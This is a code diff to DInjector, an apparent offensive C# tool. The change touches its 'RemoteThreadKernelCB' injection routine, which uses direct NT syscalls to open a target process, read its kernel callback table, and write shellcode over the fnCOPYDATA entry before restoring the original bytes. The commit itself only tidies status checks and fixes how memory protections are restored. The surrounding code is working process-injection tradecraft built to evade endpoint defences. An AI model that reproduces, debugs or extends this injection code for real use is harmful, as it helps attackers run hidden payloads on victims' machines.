@@ -3,6 +3,7 @@ using System.Diagnostics;
 using System.Runtime.InteropServices;
 
 using DI = DInvoke;
+using static DInvoke.Data.Native;
 
 namespace DInjector
 {
@@ -22,7 +23,7 @@ namespace DInjector
                 ref oa,
                 ref ci);
 
-            if (ntstatus == 0)
+            if (ntstatus == NTSTATUS.Success)
                 Console.WriteLine("(RemoteThreadKernelCB) [+] NtOpenProcess");
             else
                 Console.WriteLine($"(RemoteThreadKernelCB) [-] NtOpenProcess: {ntstatus}");
@@ -41,7 +42,7 @@ namespace DInjector
                 (uint)(IntPtr.Size * 6),
                 ref returnLength);
 
-            if (ntstatus == 0)
+            if (ntstatus == NTSTATUS.Success)
                 Console.WriteLine("(RemoteThreadKernelCB) [+] NtQueryInformationProcess");
             else
                 Console.WriteLine($"(RemoteThreadKernelCB) [-] NtQueryInformationProcess: {ntstatus}");
@@ -62,7 +63,7 @@ namespace DInjector
                 (uint)IntPtr.Size,
                 ref bytesRead);
 
-            if (ntstatus == 0)
+            if (ntstatus == NTSTATUS.Success)
                 Console.WriteLine("(RemoteThreadKernelCB) [+] NtReadVirtualMemory, kernelCallbackAddress");
             else
                 Console.WriteLine($"(RemoteThreadKernelCB) [-] NtReadVirtualMemory, kernelCallbackAddress: {ntstatus}");
@@ -87,7 +88,7 @@ namespace DInjector
                 (uint)dataSize,
                 ref bytesRead);
 
-            if (ntstatus == 0)
+            if (ntstatus == NTSTATUS.Success)
                 Console.WriteLine("(RemoteThreadKernelCB) [+] NtReadVirtualMemory, kernelCallbackValue");
             else
                 Console.WriteLine($"(RemoteThreadKernelCB) [-] NtReadVirtualMemory, kernelCallbackValue: {ntstatus}");
@@ -109,7 +110,7 @@ namespace DInjector
                 (uint)shellcode.Length,
                 ref bytesRead);
 
-            if (ntstatus == 0)
+            if (ntstatus == NTSTATUS.Success)
                 Console.WriteLine("(RemoteThreadKernelCB) [+] NtReadVirtualMemory, kernelStruct.fnCOPYDATA");
             else
                 Console.WriteLine($"(RemoteThreadKernelCB) [-] NtReadVirtualMemory, kernelStruct.fnCOPYDATA: {ntstatus}");
@@ -129,7 +130,7 @@ namespace DInjector
                 DI.Data.Win32.WinNT.PAGE_READWRITE,
                 ref oldProtect);
 
-            if (ntstatus == 0)
+            if (ntstatus == NTSTATUS.Success)
                 Console.WriteLine("(RemoteThreadKernelCB) [+] NtProtectVirtualMemory, PAGE_READWRITE");
             else
                 Console.WriteLine($"(RemoteThreadKernelCB) [-] NtProtectVirtualMemory, PAGE_READWRITE: {ntstatus}");
@@ -150,7 +151,7 @@ namespace DInjector
                 (uint)shellcode.Length,
                 ref bytesWritten);
 
-            if (ntstatus == 0)
+            if (ntstatus == NTSTATUS.Success)
                 Console.WriteLine("(RemoteThreadKernelCB) [+] NtWriteVirtualMemory, shellcode");
             else
                 Console.WriteLine($"(RemoteThreadKernelCB) [-] NtWriteVirtualMemory, shellcode: {ntstatus}");
@@ -161,14 +162,18 @@ namespace DInjector
 
             #region NtProtectVirtualMemory (oldProtect)
 
+            protectAddress = kernelStruct.fnCOPYDATA;
+            regionSize = (IntPtr)shellcode.Length;
+            uint tmpProtect = 0;
+
             ntstatus = Syscalls.NtProtectVirtualMemory(
                 hProcess,
                 ref protectAddress,
                 ref regionSize,
                 oldProtect,
-                ref oldProtect);
+                ref tmpProtect);
 
-            if (ntstatus == 0)
+            if (ntstatus == NTSTATUS.Success)
                 Console.WriteLine("(RemoteThreadKernelCB) [+] NtProtectVirtualMemory, oldProtect");
             else
                 Console.WriteLine($"(RemoteThreadKernelCB) [-] NtProtectVirtualMemory, oldProtect: {ntstatus}");
@@ -197,6 +202,8 @@ namespace DInjector
 
             #region NtProtectVirtualMemory (PAGE_READWRITE)
 
+            protectAddress = kernelStruct.fnCOPYDATA;
+            regionSize = (IntPtr)shellcode.Length;
             oldProtect = 0;
 
             ntstatus = Syscalls.NtProtectVirtualMemory(
@@ -206,7 +213,7 @@ namespace DInjector
                 DI.Data.Win32.WinNT.PAGE_READWRITE,
                 ref oldProtect);
 
-            if (ntstatus == 0)
+            if (ntstatus == NTSTATUS.Success)
                 Console.WriteLine("(RemoteThreadKernelCB) [+] NtProtectVirtualMemory, PAGE_READWRITE");
             else
                 Console.WriteLine($"(RemoteThreadKernelCB) [-] NtProtectVirtualMemory, PAGE_READWRITE: {ntstatus}");
@@ -224,7 +231,7 @@ namespace DInjector
                 (uint)shellcode.Length,
                 ref bytesWritten);
 
-            if (ntstatus == 0)
+            if (ntstatus == NTSTATUS.Success)
                 Console.WriteLine("(RemoteThreadKernelCB) [+] NtWriteVirtualMemory, origData");
             else
                 Console.WriteLine($"(RemoteThreadKernelCB) [-] NtWriteVirtualMemory, origData: {ntstatus}");
@@ -235,14 +242,18 @@ namespace DInjector
 
             #region NtProtectVirtualMemory (oldProtect)
 
+            protectAddress = kernelStruct.fnCOPYDATA;
+            regionSize = (IntPtr)shellcode.Length;
+            tmpProtect = 0;
+
             ntstatus = Syscalls.NtProtectVirtualMemory(
                 hProcess,
                 ref protectAddress,
                 ref regionSize,
                 oldProtect,
-                ref oldProtect);
+                ref tmpProtect);
 
-            if (ntstatus == 0)
+            if (ntstatus == NTSTATUS.Success)
                 Console.WriteLine("(RemoteThreadKernelCB) [+] NtProtectVirtualMemory, oldProtect");
             else
                 Console.WriteLine($"(RemoteThreadKernelCB) [-] NtProtectVirtualMemory, oldProtect: {ntstatus}");
